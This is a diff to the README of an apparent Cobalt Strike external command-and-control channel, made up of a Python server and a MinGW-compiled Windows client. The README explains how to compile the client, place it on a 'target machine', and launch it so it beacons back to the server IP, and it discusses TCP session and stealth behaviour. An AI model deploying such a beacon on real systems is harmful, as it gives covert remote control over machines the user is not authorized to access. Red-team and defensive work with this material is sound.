@@ -20,21 +20,23 @@ If you have the MinGW compiler installed, you may compile the client C code with
 
 >i686-w64-mingw32-gcc -s -O3 -fvisibility=hidden -o client.exe client.c -lws2_32
 
+You can compile the debug version of the client with print statements by adding `-DDEBUG` to the end of the compile command
+
 Change the client exe name if desired.
 Move the resultant executable to your target machine, and then run it with the following command:
 
->./[Name].exe [Python Server IP] [Port] [Pipename] [Sleep]
+>./[Name].exe [Python Server IP] [Port] [Pipename] [Sleep] [Timeout]
 
 - [Name] is the name of your client executable.
 - [Python Server IP], [Port], and [Pipename] must be the same as the ones passed to server.py.
-- [Sleep] is the sleep time (in seconds) to wait between check ins with the server.
+- [Sleep] is the sleep time (in seconds) to wait between check ins with the server. It hits this sleep when the beacon indicates it has nothing left to send back to the server and is just checking in.
+- [Timeout] is the send/recv socket timeout option (in seconds) set by setsockopt(). May remove in future.
 
-## CONSTRAINTS
+## CONSTRAINTS AND NOTES
 
 - This channel expects only one client per instance of server.py. Multiple clients communicating with the same server requires multiple instances of server.py running on different ports.
-- This channel does not disconnect its beacon connection. If the server goes down, the client will continue sending packet retransmissions to the dead IP address until the process is killed. (Unless there is a read error on the socket) This may pose stealth issues.
 - Once a connection is established, it keeps the TCP connection open until the client is terminated. This can result in extreamly long lasting TCP sessions.
-- Mudge defined max payload size as 512 \* 1024 and max buffer size as 1024 \* 1024.
+- Note: Mudge defined max payload size as 512 \* 1024 and max buffer size as 1024 \* 1024.
 
 ## TODOS/IMPROVEMENTS
 
